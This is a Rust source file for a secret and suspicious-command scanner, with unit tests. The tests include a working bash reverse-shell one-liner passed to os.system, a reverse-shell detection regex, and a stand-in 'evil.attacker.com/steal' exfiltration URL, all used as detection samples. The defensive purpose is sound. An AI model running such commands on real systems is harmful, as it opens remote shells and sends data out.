use std::collections::HashSet;

use base64::{engine::general_purpose, Engine as _};
use regex::Regex;

use crate::confidence::{calculate_pattern_confidence, get_base_confidence};
use crate::context::{
    is_likely_comment, is_public_ioc, is_safe_context_for_suspicious_commands,
    classify_file_context, BlockCommentTracker,
};
use crate::error::AnalyzerError;
use crate::types::{AnalysisResult, Finding, Ioc};

/// The main detection engine. Scans source code content for secrets,
/// suspicious commands, high-entropy strings, and IOCs.
///
/// Create with [`SecretAnalyzer::new`] by providing regex rules,
/// then call [`analyze_content`](Self::analyze_content) for each file.
pub struct SecretAnalyzer {
    secret_patterns: Vec<(String, Regex)>,
    suspicious_patterns: Vec<(String, Regex)>,
    long_string_regex: Regex,
    base64_regex: Regex,
    url_regex: Regex,
    js_keywords: Vec<String>,
}

impl SecretAnalyzer {
    /// Creates a new analyzer with the given detection rules.
    ///
    /// - `rules`: Secret detection patterns (e.g. AWS keys, tokens). Each is `(rule_id, regex)`.
    /// - `suspicious_rules`: Command/behavior patterns (e.g. reverse shells). These are
    ///   automatically skipped in safe contexts like import statements.
    ///
    /// Returns [`AnalyzerError::InvalidPattern`] if any regex is invalid.
    pub fn new(
        rules: impl IntoIterator<Item = (String, String)>,
        suspicious_rules: impl IntoIterator<Item = (String, String)>,
    ) -> Result<Self, AnalyzerError> {
        let mut secret_compiled = Vec::new();
        for (id, pattern) in rules {
            let re = Regex::new(&pattern).map_err(|e| AnalyzerError::InvalidPattern {
                rule_id: id.clone(),
                source: e,
            })?;
            secret_compiled.push((id, re));
        }

        let mut suspicious_compiled = Vec::new();
        for (id, pattern) in suspicious_rules {
            let re = Regex::new(&pattern).map_err(|e| AnalyzerError::InvalidPattern {
                rule_id: id.clone(),
                source: e,
            })?;
            suspicious_compiled.push((id, re));
        }

        Ok(SecretAnalyzer {
            secret_patterns: secret_compiled,
            suspicious_patterns: suspicious_compiled,
            long_string_regex: Regex::new(r#"["']([a-zA-Z0-9+/=,.\-_]{50,})["']"#)
                .map_err(|e| AnalyzerError::InvalidPattern {
                    rule_id: "long_string_builtin".into(),
                    source: e,
                })?,
            base64_regex: Regex::new(r"\b([A-Za-z0-9+/=_-]{20,})\b").map_err(|e| {
                AnalyzerError::InvalidPattern {
                    rule_id: "base64_builtin".into(),
                    source: e,
                }
            })?,
            url_regex: Regex::new(r"https?://[a-zA-Z0-9.\-_]+(?:/[^\s<>\x22\x27]*)?").map_err(
                |e| AnalyzerError::InvalidPattern {
                    rule_id: "url_builtin".into(),
                    source: e,
                },
            )?,
            js_keywords: vec![
                "eval".to_string(),
                "document.write".to_string(),
                "innerHTML".to_string(),
                "unescape".to_string(),
                "crypto.subtle".to_string(),
            ],
        })
    }

    /// Analyzes the content of a single file for secrets, suspicious patterns, and IOCs.
    ///
    /// - `content`: The full text content of the file.
    /// - `file_path`: Relative path (e.g. `"src/config.py"`), used for file context classification.
    /// - `file_name`: Just the filename (e.g. `"config.py"`), used for extension-based logic.
    ///
    /// Returns an [`AnalysisResult`] with all findings and extracted IOCs.
    pub fn analyze_content(
        &self,
        content: &str,
        file_path: &str,
        file_name: &str,
    ) -> AnalysisResult {
        let mut result = AnalysisResult::new();
        let mut existing_findings: HashSet<(String, String)> = HashSet::new();
        let mut existing_iocs: HashSet<String> = HashSet::new();

        let extension = file_name.split('.').last().unwrap_or("").to_lowercase();
        let is_js_ts = extension == "js" || extension == "ts";
        let is_safe_context = is_safe_context_for_suspicious_commands(file_path, &extension);
        let file_context = classify_file_context(file_path);
        let context_multiplier = file_context.multiplier();
        let mut block_tracker = BlockCommentTracker::new(&extension);

        for line in content.lines() {
            let in_block_comment = block_tracker.update(line);

            if is_likely_comment(line, &extension) && !in_block_comment {
                continue;
            }

            let comment_multiplier = if in_block_comment { 0.1 } else { 1.0 };

            if is_js_ts {
                self.check_js_keywords(
                    line,
                    file_path,
                    file_context,
                    context_multiplier,
                    comment_multiplier,
                    &mut existing_findings,
                    &mut result,
                );
            }

            self.check_secret_patterns(
                line,
                file_path,
                file_context,
                context_multiplier,
                comment_multiplier,
                &mut existing_findings,
                &mut result,
            );

            if !is_safe_context {
                self.check_suspicious_patterns(
                    line,
                    file_path,
                    file_context,
                    context_multiplier,
                    comment_multiplier,
                    &mut result,
                );
            }
        }

        self.check_high_entropy_strings(
            content,
            file_path,
            &extension,
            file_context,
            context_multiplier,
            &mut existing_findings,
            &mut result,
        );

        self.check_base64_iocs(
            content,
            file_path,
            file_context,
            context_multiplier,
            &mut existing_iocs,
            &mut result,
        );

        self.extract_urls(content, file_path, &mut existing_iocs, &mut result);

        result
    }

    fn check_js_keywords(
        &self,
        line: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        comment_multiplier: f64,
        existing: &mut HashSet<(String, String)>,
        result: &mut AnalysisResult,
    ) {
        for keyword in &self.js_keywords {
            if line.contains(keyword.as_str()) {
                let desc = format!("Suspicious JS keyword '{}'", keyword);
                let key = (desc.clone(), "Suspicious JS Keyword".to_string());
                if existing.insert(key) {
                    let base_conf = get_base_confidence("Suspicious JS Keyword");
                    let conf = (base_conf * context_multiplier * comment_multiplier).clamp(0.0, 1.0);
                    result.findings.push(Finding {
                        description: desc,
                        finding_type: "Suspicious JS Keyword".to_string(),
                        file: file_path.to_string(),
                        match_content: line.trim().to_string(),
                        confidence: conf,
                        file_context,
                    });
                }
            }
        }
    }

    fn check_secret_patterns(
        &self,
        line: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        comment_multiplier: f64,
        existing: &mut HashSet<(String, String)>,
        result: &mut AnalysisResult,
    ) {
        for (id, re) in &self.secret_patterns {
            for caps in re.captures_iter(line) {
                if let Some(m) = caps.get(0) {
                    let matched_str = m.as_str();
                    let match_start = m.start();
                    let raw_conf =
                        calculate_pattern_confidence(id, matched_str, line, match_start);
                    let conf = (raw_conf * context_multiplier * comment_multiplier).clamp(0.0, 1.0);

                    if id == "Generic API Key" {
                        result.findings.push(Finding {
                            description: "Possible API key.".to_string(),
                            finding_type: id.clone(),
                            file: file_path.to_string(),
                            match_content: matched_str.to_string(),
                            confidence: conf,
                            file_context,
                        });
                    } else {
                        let desc = format!("Possible exposed secret '{}'", id);
                        let key = (desc.clone(), id.clone());
                        if existing.insert(key) {
                            result.findings.push(Finding {
                                description: desc,
                                finding_type: id.clone(),
                                file: file_path.to_string(),
                                match_content: matched_str.to_string(),
                                confidence: conf,
                                file_context,
                            });
                        }
                    }
                }
            }
        }
    }

    fn check_suspicious_patterns(
        &self,
        line: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        comment_multiplier: f64,
        result: &mut AnalysisResult,
    ) {
        for (id, re) in &self.suspicious_patterns {
            if re.is_match(line) {
                let line_trim = line.trim();
                if line_trim.starts_with("import ")
                    || line_trim.starts_with("from ")
                    || line_trim.contains("console.log")
                {
                    continue;
                }
                for caps in re.captures_iter(line) {
                    if let Some(m) = caps.get(0) {
                        let raw_conf =
                            calculate_pattern_confidence(id, m.as_str(), line, m.start());
                        let conf =
                            (raw_conf * context_multiplier * comment_multiplier).clamp(0.0, 1.0);
                        result.findings.push(Finding {
                            description: format!("Comando suspeito: '{}'", id),
                            finding_type: id.clone(),
                            file: file_path.to_string(),
                            match_content: m.as_str().to_string(),
                            confidence: conf,
                            file_context,
                        });
                    }
                }
            }
        }
    }

    fn check_high_entropy_strings(
        &self,
        content: &str,
        file_path: &str,
        extension: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        existing: &mut HashSet<(String, String)>,
        result: &mut AnalysisResult,
    ) {
        if matches!(
            extension,
            "js" | "ts" | "py" | "env" | "json" | "xml" | "yaml"
        ) {
            for caps in self.long_string_regex.captures_iter(content) {
                if let Some(matched) = caps.get(1) {
                    let s = matched.as_str();
                    let entropy = crate::confidence::calculate_entropy(s);
                    if entropy > 5.2 {
                        let desc = format!("High entropy string ({:.2})", entropy);
                        let key = (desc.clone(), "High Entropy String".to_string());
                        if existing.insert(key) {
                            let raw_conf = (entropy - 5.2) / 2.0 + 0.3;
                            let conf = (raw_conf.min(0.85) * context_multiplier).clamp(0.0, 1.0);
                            result.findings.push(Finding {
                                description: desc,
                                finding_type: "High Entropy String".to_string(),
                                file: file_path.to_string(),
                                match_content: s.to_string(),
                                confidence: conf,
                                file_context,
                            });
                        }
                    }
                }
            }
        }
    }

    fn check_base64_iocs(
        &self,
        content: &str,
        file_path: &str,
        file_context: crate::types::FileContext,
        context_multiplier: f64,
        existing_iocs: &mut HashSet<String>,
        result: &mut AnalysisResult,
    ) {
        for caps in self.base64_regex.captures_iter(content) {
            if let Some(m) = caps.get(1) {
                let s = m.as_str();
                let decoded = general_purpose::STANDARD
                    .decode(s)
                    .or_else(|_| general_purpose::STANDARD_NO_PAD.decode(s));
                if let Ok(bytes) = decoded {
                    if let Ok(decoded_str) = String::from_utf8(bytes) {
                        for url_match in self.url_regex.find_iter(&decoded_str) {
                            let url = url_match.as_str();
                            if is_public_ioc(url) && existing_iocs.insert(url.to_string()) {
                                let desc = format!(
                                    "Obfuscated URL in Base64: {}...",
                                    &url[..std::cmp::min(50, url.len())]
                                );
                                let conf = (0.70 * context_multiplier).clamp(0.0, 1.0);
                                result.findings.push(Finding {
                                    description: desc,
                                    finding_type: "Hidden IOC (Base64)".to_string(),
                                    file: file_path.to_string(),
                                    match_content: url.to_string(),
                                    confidence: conf,
                                    file_context,
                                });
                                result.iocs.push(Ioc {
                                    ioc: url.to_string(),
                                    source_file: file_path.to_string(),
                                });
                            }
                        }
                    }
                }
            }
        }
    }

    fn extract_urls(
        &self,
        content: &str,
        file_path: &str,
        existing_iocs: &mut HashSet<String>,
        result: &mut AnalysisResult,
    ) {
        for url_match in self.url_regex.find_iter(content) {
            let url = url_match.as_str();
            if is_public_ioc(url) && existing_iocs.insert(url.to_string()) {
                result.iocs.push(Ioc {
                    ioc: url.to_string(),
                    source_file: file_path.to_string(),
                });
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_analyzer() -> SecretAnalyzer {
        let rules = vec![
            ("AWS Key".to_string(), r"AKIA[0-9A-Z]{16}".to_string()),
            (
                "GitHub Token".to_string(),
                r"ghp_[a-zA-Z0-9]{36}".to_string(),
            ),
            (
                "Generic API Key".to_string(),
                r"(?i)api[_\-]?key\s*[:=]\s*['\x22]?([a-zA-Z0-9_\x2d]{20,})['\x22]?".to_string(),
            ),
        ];
        let suspicious = vec![(
            "Reverse Shell".to_string(),
            r"(?i)bash\s+-i\s+>&\s+/dev/tcp".to_string(),
        )];
        SecretAnalyzer::new(rules, suspicious).expect("valid patterns")
    }

    #[test]
    fn test_detect_aws_key() {
        let analyzer = test_analyzer();
        let content = "aws_key = AKIAIOSFODNN7EXAMPLE1";
        let result = analyzer.analyze_content(content, "src/config.py", "config.py");
        assert!(!result.findings.is_empty());
        assert_eq!(result.findings[0].finding_type, "AWS Key");
    }

    #[test]
    fn test_detect_github_token() {
        let analyzer = test_analyzer();
        let content = "token = ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345abcd";
        let result = analyzer.analyze_content(content, "src/auth.py", "auth.py");
        let github_findings: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.finding_type == "GitHub Token")
            .collect();
        assert!(!github_findings.is_empty());
    }

    #[test]
    fn test_test_file_lower_confidence() {
        let analyzer = test_analyzer();
        let content = "aws_key = AKIAIOSFODNN7EXAMPLE1";
        let prod = analyzer.analyze_content(content, "src/config.py", "config.py");
        let test = analyzer.analyze_content(content, "tests/test_config.py", "test_config.py");
        assert!(prod.findings[0].confidence > test.findings[0].confidence);
    }

    #[test]
    fn test_url_extraction() {
        let analyzer = test_analyzer();
        let content = "callback = 'http://evil.attacker.com/steal?data=1'";
        let result = analyzer.analyze_content(content, "src/app.py", "app.py");
        assert!(!result.iocs.is_empty());
        assert!(result.iocs[0].ioc.contains("evil.attacker.com"));
    }

    #[test]
    fn test_skip_localhost() {
        let analyzer = test_analyzer();
        let content = "url = 'http://localhost:8080/api'";
        let result = analyzer.analyze_content(content, "src/app.py", "app.py");
        assert!(result.iocs.is_empty());
    }

    #[test]
    fn test_suspicious_command() {
        let analyzer = test_analyzer();
        let content = "os.system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')";
        let result = analyzer.analyze_content(content, "src/exploit.py", "exploit.py");
        let suspicious: Vec<_> = result
            .findings
            .iter()
            .filter(|f| f.finding_type == "Reverse Shell")
            .collect();
        assert!(!suspicious.is_empty());
    }
}
